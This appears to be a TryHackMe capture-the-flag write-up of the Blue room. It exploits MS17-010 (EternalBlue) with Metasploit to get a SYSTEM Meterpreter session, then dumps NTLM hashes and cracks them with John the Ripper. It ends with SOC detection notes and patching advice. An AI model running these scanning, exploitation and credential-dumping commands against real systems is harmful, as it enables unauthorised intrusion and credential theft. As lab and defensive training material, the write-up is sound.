# TryHackMe — Blue (MS17-010 / EternalBlue)

> **Category:** Penetration Testing | **Difficulty:** Easy | **Platform:** TryHackMe

---

## Overview

A full attack chain walkthrough of the TryHackMe Blue room, demonstrating exploitation of **MS17-010 (EternalBlue)** — the same vulnerability used in the real-world WannaCry ransomware attack. This writeup covers reconnaissance, exploitation, post-exploitation, credential dumping, and detection from a SOC perspective.

📄 **Full Writeup on Medium:** [Read Here](https://medium.com/@rajeesh8214/tryhackme-blue-walkthrough-ms17-010-eternalblue-exploitation-soc-analysis-4e51febc8b2c)

---

## Attack Flow

| Step | Action | Tool |
|------|--------|------|
| 1 | Network scan — identified SMB on port 445 | Nmap |
| 2 | Confirmed MS17-010 vulnerability | Nmap scripts |
| 3 | Exploited EternalBlue | Metasploit |
| 4 | Gained Meterpreter session with SYSTEM privileges | Metasploit |
| 5 | Post-exploitation enumeration & flag retrieval | Meterpreter |
| 6 | Dumped NTLM password hashes | hashdump |
| 7 | Cracked weak user credentials | John the Ripper |

---

## Commands Used

**Reconnaissance**
```bash
nmap -p- -sV -sC -T4 <target_ip>
nmap --script smb-vuln-ms17-010 -p 445 <target_ip>
```

**Exploitation**
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set LHOST <attacker_ip>
run
```

**Privilege Verification**
```bash
sysinfo
getuid
# Output: NT AUTHORITY\SYSTEM
```

**Credential Dumping**
```bash
hashdump
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## Key Findings

- Target: Windows 7 Professional SP1 with SMBv1 enabled
- Access Level: NT AUTHORITY\SYSTEM (full administrative control)
- Cracked Credential: User `Jon` — weak password recovered in seconds
- Flags retrieved from: `C:\`, `C:\Windows\System32\config`, `C:\Users\Jon\Documents`

---

## SOC Detection Notes

This attack generates several detectable indicators:

- Unusual SMB traffic spikes on port 445
- Unexpected process spawning (`cmd.exe`, `powershell.exe`)
- LSASS memory access (credential dumping activity)
- Privilege escalation to SYSTEM from a user context

**SIEM alerting ideas:** abnormal SMB patterns, SAM database access, reverse shell beaconing, unauthorized privilege escalation events.

---

## Skills Demonstrated

- Network Enumeration (Nmap)
- Vulnerability Identification (MS17-010)
- Exploitation (Metasploit)
- Post-Exploitation (Meterpreter)
- Credential Dumping & Cracking (John the Ripper)
- Security Monitoring & Detection (SOC perspective)

---

## Key Takeaway

> One unpatched service + one weak password = full system compromise in under 15 minutes.

Patch management, SMB exposure controls, and strong password policies aren't optional — they're the baseline.

---

*Part of my ongoing TryHackMe writeup series. More rooms coming soon.*
